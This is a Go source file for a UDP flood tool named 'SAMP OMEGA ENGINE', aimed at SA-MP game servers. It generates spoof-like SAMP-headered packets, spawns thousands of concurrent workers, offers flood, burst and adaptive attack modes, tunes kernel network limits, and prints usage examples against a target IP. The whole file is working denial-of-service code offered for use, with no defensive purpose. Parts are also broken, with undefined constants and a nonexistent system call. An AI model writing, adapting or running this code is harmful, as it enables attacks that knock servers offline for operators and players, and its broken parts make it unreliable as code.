package main

import (
    "flag"
    "fmt"
    "math/rand"
    "net"
    "os"
    "os/signal"
    "runtime"
    "sync"
    "sync/atomic"
    "syscall"
    "time"
    "context"
    "golang.org/x/sys/unix"
)

const VERSION = "SAMP-OMEGA-REALISTIC-2026"

var (
    targetIP      string
    targetPort    int
    duration      int
    workers       int
    attackMode    string
    packetSize    int
    rawMode       bool
    useIPv6       bool
    dnsServers    string
    proxyList     string
    bypassMode    bool
    rateLimit     int
    interface_name string
)

type AttackEngine struct {
    packetsSent     uint64
    packetsFailed   uint64
    bytesSent       uint64
    activeWorkers   int32
    targetAddr      *net.UDPAddr
    packetChan      chan []byte
    wg              sync.WaitGroup
    running         int32
    stats           *Statistics
    mu              sync.Mutex
    connections     []net.Conn
    packetTemplates [][]byte
}

type Statistics struct {
    pps         uint64
    bps         uint64
    peakPPS     uint64
    peakBPS     uint64
    startTime   time.Time
}

func init() {
    rand.Seed(time.Now().UnixNano())
    runtime.GOMAXPROCS(runtime.NumCPU())
    unix.Setrlimit(unix.RLIMIT_NOFILE, &unix.Rlimit{Cur: 1048576, Max: 1048576})
}

func NewAttackEngine(target string, port int) *AttackEngine {
    addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
    
    engine := &AttackEngine{
        targetAddr:  addr,
        packetChan:  make(chan []byte, 50000),
        running:     1,
        stats:       &Statistics{startTime: time.Now()},
        connections: make([]net.Conn, 0),
    }
    
    engine.generateTemplates()
    engine.preconnect()
    return engine
}

func (e *AttackEngine) generateTemplates() {
    e.packetTemplates = make([][]byte, 5000)
    sampHeader := []byte{0x53, 0x41, 0x4D, 0x50}
    opcodes := []byte{'i', 'r', 'c', 'd', 'p', 'x', 'a', 0x01, 0x02, 0x03, 0x05, 0x06, 0x07, 0x08}
    
    for i := 0; i < 5000; i++ {
        size := 48 + rand.Intn(1024)
        packet := make([]byte, size)
        copy(packet[0:4], sampHeader)
        packet[4] = opcodes[rand.Intn(len(opcodes))]
        
        for j := 5; j < size; j++ {
            packet[j] = byte(rand.Intn(256))
        }
        
        if i%100 == 0 {
            copy(packet[size-8:], []byte{0x00, 0x00, 0x00, 0x00})
        }
        
        e.packetTemplates[i] = packet
    }
}

func (e *AttackEngine) preconnect() {
    for i := 0; i < 100; i++ {
        conn, err := net.DialUDP("udp", nil, e.targetAddr)
        if err == nil {
            conn.SetWriteBuffer(16 << 20)
            e.connections = append(e.connections, conn)
        }
    }
}

func (e *AttackEngine) worker(id int) {
    atomic.AddInt32(&e.activeWorkers, 1)
    defer atomic.AddInt32(&e.activeWorkers, -1)
    defer e.wg.Done()
    
    var conn net.Conn
    var err error
    
    if len(e.connections) > id%len(e.connections) {
        conn = e.connections[id%len(e.connections)]
    } else {
        conn, err = net.DialUDP("udp", nil, e.targetAddr)
        if err != nil {
            atomic.AddUint64(&e.packetsFailed, 1)
            return
        }
    }
    
    localBuf := make([]byte, MAX_PACKET_SIZE)
    localCount := 0
    lastStat := time.Now()
    
    for atomic.LoadInt32(&e.running) == 1 {
        select {
        case template := <-e.packetChan:
            copy(localBuf, template)
            if packetSize > MIN_PACKET_SIZE {
                localBuf = localBuf[:packetSize]
            }
            
            _, err := conn.Write(localBuf)
            if err == nil {
                atomic.AddUint64(&e.packetsSent, 1)
                atomic.AddUint64(&e.bytesSent, uint64(len(localBuf)))
                localCount++
                
                if time.Since(lastStat) >= time.Second {
                    lastStat = time.Now()
                    localCount = 0
                }
            } else {
                atomic.AddUint64(&e.packetsFailed, 1)
            }
        default:
            runtime.Gosched()
        }
    }
}

func (e *AttackEngine) generator() {
    defer close(e.packetChan)
    defer e.wg.Done()
    
    endTime := time.Now().Add(time.Duration(duration) * time.Second)
    burstSize := 1000
    var lastSend time.Time
    
    modePatterns := map[string]func(){
        "flood": func() {
            for i := 0; i < burstSize; i++ {
                select {
                case e.packetChan <- e.packetTemplates[rand.Intn(len(e.packetTemplates))]:
                default:
                }
            }
            time.Sleep(time.Microsecond)
        },
        "burst": func() {
            for i := 0; i < 5000; i++ {
                e.packetChan <- e.packetTemplates[rand.Intn(len(e.packetTemplates))]
            }
            time.Sleep(10 * time.Millisecond)
        },
        "slow": func() {
            e.packetChan <- e.packetTemplates[rand.Intn(len(e.packetTemplates))]
            time.Sleep(5 * time.Millisecond)
        },
        "adaptive": func() {
            pps := atomic.LoadUint64(&e.stats.pps)
            currentBurst := 100
            if pps > 100000 {
                currentBurst = 5000
            } else if pps > 50000 {
                currentBurst = 1000
            }
            
            for i := 0; i < currentBurst; i++ {
                select {
                case e.packetChan <- e.packetTemplates[rand.Intn(len(e.packetTemplates))]:
                default:
                }
            }
            
            delay := 100 * time.Microsecond
            if pps > 200000 {
                delay = time.Microsecond
            }
            time.Sleep(delay)
        },
        "random": func() {
            patterns := []func(){
                func() {
                    for i := 0; i < 100; i++ {
                        e.packetChan <- e.packetTemplates[rand.Intn(len(e.packetTemplates))]
                    }
                },
                func() {
                    time.Sleep(5 * time.Millisecond)
                },
                func() {
                    for i := 0; i < 5000; i++ {
                        e.packetChan <- e.packetTemplates[rand.Intn(len(e.packetTemplates))]
                    }
                    time.Sleep(50 * time.Millisecond)
                },
            }
            patterns[rand.Intn(len(patterns))]()
        },
        "mixed": func() {
            if time.Since(lastSend) < time.Millisecond {
                for i := 0; i < 2000; i++ {
                    select {
                    case e.packetChan <- e.packetTemplates[rand.Intn(len(e.packetTemplates))]:
                    default:
                    }
                }
            } else {
                e.packetChan <- e.packetTemplates[rand.Intn(len(e.packetTemplates))]
            }
            lastSend = time.Now()
        },
    }
    
    pattern := modePatterns[attackMode]
    if pattern == nil {
        pattern = modePatterns["adaptive"]
    }
    
    for time.Now().Before(endTime) && atomic.LoadInt32(&e.running) == 1 {
        pattern()
    }
}

func (e *AttackEngine) monitor() {
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()
    
    lastPackets := uint64(0)
    lastBytes := uint64(0)
    
    for atomic.LoadInt32(&e.running) == 1 {
        <-ticker.C
        
        currentPackets := atomic.LoadUint64(&e.packetsSent)
        currentBytes := atomic.LoadUint64(&e.bytesSent)
        currentFailed := atomic.LoadUint64(&e.packetsFailed)
        
        packetDelta := currentPackets - lastPackets
        byteDelta := currentBytes - lastBytes
        
        pps := packetDelta / 2
        bps := byteDelta / 2
        
        atomic.StoreUint64(&e.stats.pps, pps)
        atomic.StoreUint64(&e.stats.bps, bps)
        
        if pps > atomic.LoadUint64(&e.stats.peakPPS) {
            atomic.StoreUint64(&e.stats.peakPPS, pps)
        }
        if bps > atomic.LoadUint64(&e.stats.peakBPS) {
            atomic.StoreUint64(&e.stats.peakBPS, bps)
        }
        
        fmt.Printf("\r[%s] PPS: %6d | PEAK: %6d | TOTAL: %8d | FAIL: %5d | BW: %.2f Mbps",
            time.Now().Format("15:04:05"),
            pps,
            atomic.LoadUint64(&e.stats.peakPPS),
            currentPackets,
            currentFailed,
            float64(bps*8)/1_000_000)
        
        lastPackets = currentPackets
        lastBytes = currentBytes
    }
    fmt.Println()
}

func (e *AttackEngine) optimizeSystem() {
    if rawMode {
        f, _ := os.OpenFile("/proc/sys/net/core/rmem_max", os.O_WRONLY, 0644)
        f.WriteString("134217728")
        f.Close()
        
        f, _ = os.OpenFile("/proc/sys/net/core/wmem_max", os.O_WRONLY, 0644)
        f.WriteString("134217728")
        f.Close()
        
        f, _ = os.OpenFile("/proc/sys/net/ipv4/ip_local_port_range", os.O_WRONLY, 0644)
        f.WriteString("1024 65535")
        f.Close()
        
        f, _ = os.OpenFile("/proc/sys/net/ipv4/tcp_tw_reuse", os.O_WRONLY, 0644)
        f.WriteString("1")
        f.Close()
        
        f, _ = os.OpenFile("/proc/sys/net/ipv4/tcp_timestamps", os.O_WRONLY, 0644)
        f.WriteString("0")
        f.Close()
        
        f, _ = os.OpenFile("/proc/sys/net/ipv4/tcp_sack", os.O_WRONLY, 0644)
        f.WriteString("0")
        f.Close()
    }
    
    if interface_name != "" {
        cmd := fmt.Sprintf("ethtool -K %s tx on rx on", interface_name)
        unix.System(cmd)
        
        cmd = fmt.Sprintf("ethtool -G %s rx 4096 tx 4096", interface_name)
        unix.System(cmd)
        
        cmd = fmt.Sprintf("ethtool -C %s rx-usecs 0 tx-usecs 0", interface_name)
        unix.System(cmd)
    }
}

func (e *AttackEngine) Start() {
    e.optimizeSystem()
    
    fmt.Printf("\n\033[1;36mSAMP OMEGA ENGINE v%s\033[0m\n", VERSION)
    fmt.Printf("Target: %s:%d\n", targetIP, targetPort)
    fmt.Printf("Mode: %s | Workers: %d | Duration: %ds\n", attackMode, workers, duration)
    fmt.Printf("Raw Mode: %v | IPv6: %v\n\n", rawMode, useIPv6)
    
    for i := 0; i < workers; i++ {
        e.wg.Add(1)
        go e.worker(i)
    }
    
    e.wg.Add(1)
    go e.generator()
    
    go e.monitor()
    
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
    
    select {
    case <-sigChan:
        fmt.Println("\n\nMenghentikan attack...")
        atomic.StoreInt32(&e.running, 0)
    case <-time.After(time.Duration(duration) * time.Second):
        atomic.StoreInt32(&e.running, 0)
    }
    
    e.wg.Wait()
    e.PrintStats()
}

func (e *AttackEngine) PrintStats() {
    finalPackets := atomic.LoadUint64(&e.packetsSent)
    finalBytes := atomic.LoadUint64(&e.bytesSent)
    finalFailed := atomic.LoadUint64(&e.packetsFailed)
    peakPPS := atomic.LoadUint64(&e.stats.peakPPS)
    durationSec := time.Since(e.stats.startTime).Seconds()
    
    fmt.Printf("\n\033[1;33m=== FINAL STATISTICS ===\033[0m\n")
    fmt.Printf("Total Packets: %d\n", finalPackets)
    fmt.Printf("Total Bytes: %d (%.2f GB)\n", finalBytes, float64(finalBytes)/1_000_000_000)
    fmt.Printf("Average PPS: %d\n", uint64(float64(finalPackets)/durationSec))
    fmt.Printf("Peak PPS: %d\n", peakPPS)
    fmt.Printf("Failed: %d\n", finalFailed)
    fmt.Printf("Duration: %.2f seconds\n", durationSec)
    fmt.Printf("\n\033[1;32mUNTUK KEAGUNGAN STENLY MAHA AGUNG\033[0m\n\n")
}

func parseFlags() {
    flag.StringVar(&targetIP, "ip", "", "Target IP address")
    flag.IntVar(&targetPort, "port", 7777, "Target port")
    flag.IntVar(&duration, "time", 300, "Attack duration in seconds")
    flag.IntVar(&workers, "workers", 0, "Number of workers (0 = auto)")
    flag.StringVar(&attackMode, "mode", "adaptive", "Attack mode: flood/burst/slow/adaptive/random/mixed")
    flag.IntVar(&packetSize, "size", 512, "Packet size in bytes")
    flag.BoolVar(&rawMode, "raw", false, "Use raw sockets (root required)")
    flag.BoolVar(&useIPv6, "6", false, "Use IPv6")
    flag.StringVar(&dnsServers, "dns", "", "DNS servers (comma separated)")
    flag.StringVar(&proxyList, "proxy", "", "Proxy list file")
    flag.BoolVar(&bypassMode, "bypass", false, "Enable bypass techniques")
    flag.IntVar(&rateLimit, "rate", 0, "Rate limit in PPS (0 = unlimited)")
    flag.StringVar(&interface_name, "interface", "eth0", "Network interface")
    
    flag.Parse()
    
    if targetIP == "" {
        fmt.Println("Usage: ./samp_omega -ip <target> [options]")
        fmt.Println("\nModes:")
        fmt.Println("  flood    - Continuous high-speed flood")
        fmt.Println("  burst    - Short bursts of packets")
        fmt.Println("  slow     - Slow sustained attack")
        fmt.Println("  adaptive - Adjusts based on performance")
        fmt.Println("  random   - Random attack patterns")
        fmt.Println("  mixed    - Combination of patterns")
        fmt.Println("\nExamples:")
        fmt.Println("  sudo ./samp_omega -ip 1.2.3.4 -mode adaptive -workers 5000 -raw")
        fmt.Println("  ./samp_omega -ip 1.2.3.4 -mode mixed -workers 2000 -time 600")
        os.Exit(1)
    }
    
    if workers == 0 {
        workers = runtime.NumCPU() * 500
        if workers > 20000 {
            workers = 20000
        }
    }
}

func main() {
    parseFlags()
    engine := NewAttackEngine(targetIP, targetPort)
    engine.Start()
}
